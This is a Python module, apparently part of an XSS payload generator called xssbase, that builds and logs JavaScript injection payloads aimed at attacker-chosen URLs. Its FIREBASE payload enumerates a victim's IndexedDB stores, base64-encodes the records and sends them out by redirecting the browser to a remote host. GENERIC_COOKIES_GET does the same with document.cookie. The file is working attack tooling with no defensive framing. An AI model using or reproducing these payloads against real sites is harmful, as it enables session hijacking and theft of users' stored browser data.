import xssbase.lib.var as var
import xssbase.lib.logger as log

def router(args):
	args=args.split()
	minified=False
	exposed=False
	local=False
	payloads=[]
	payload=""
	payloadFind=False
	triggerExists=False

	if("minified" in args or "mini" in args):
		minified=True

	if("local" in args):
		local=True

	if("exposed" in args):
		exposed=True

	if("trigger" in args):
		triggerExists=True

	for arg in args: 
		if(arg.upper() in PAYLOAD):
			payloadFind=True
			payload=PAYLOAD[arg.upper()]

	if(not payloadFind):
		payloadAvailable=PAYLOAD.keys()
		print(', '.join([k.lower() for k in PAYLOAD.keys()]))

	if(local):
		for url in var.var_localServices:
			payloads.append(payload.replace("TO_REPLACE",url))
	elif(exposed):
		for url in var.var_exposedServices:
			payloads.append(payload.replace("TO_REPLACE",url))
	else:
		url=""
		payloads.append(payload.replace("TO_REPLACE",url))

	for payload in payloads:
		if(minified):
			if(triggerExists):
				log.payload(var.var_trigger % minify(payload))
			else:
				log.payload(minify(payload))
		else:
			if(triggerExists):
				log.payload(var.var_trigger % payload)
			else:
				log.payload(payload)

	return 

def minify(payload):
	payload=payload.replace("\t","");
	payload=payload.replace("\r","");
	payload=payload.replace("\n","");
	return payload

PAYLOAD={}

PAYLOAD['FIREBASE'] = """
	var REMOTE_URL="TO_REPLACE";
	indexedDB.databases().then(d =>{
		d.forEach(db=>{
			var DB_NAME=db.name;
			var DB_VERSION=db.version;
			var open=window.indexedDB.open(DB_NAME,DB_VERSION);
			open.onsuccess = function(){
				console.log("Db Opened");
				var db = open.result;
				var transaction = db.transaction(db.objectStoreNames[0],"readwrite");
				var internalStoreName=transaction.objectStoreNames[0];
				var store = transaction.objectStore(internalStoreName);
				var allKeys = store.getAllKeys();
				allKeys.onsuccess =function(o){
					for (var i = allKeys.result.length - 1; i<=allKeys.result.length; i++) {
					 	let key=allKeys.result[i];
					 	if(key!=undefined){
						 	try{
						 		var getResults = store.get(key);
					 			getResults.onsuccess=function(){
					 				toSend=btoa(JSON.stringify(getResults.result));
					 				window.location.href='REMOTE_URL'+'/success/'+toSend
					 			}
						 	}catch(err){
						 		toSend=btoa(JSON.stringify(err));
					 			window.location.href='REMOTE_URL'+'/error/'+toSend
						 	}
					 	}
					}
				}
			}
		});
	});
"""

PAYLOAD['GENERIC']="""window.location.href='TO_REPLACE'"""
PAYLOAD['GENERIC_COOKIES_GET']="""window.location.href='TO_REPLACE'+'/'+btoa(document.cookie)"""

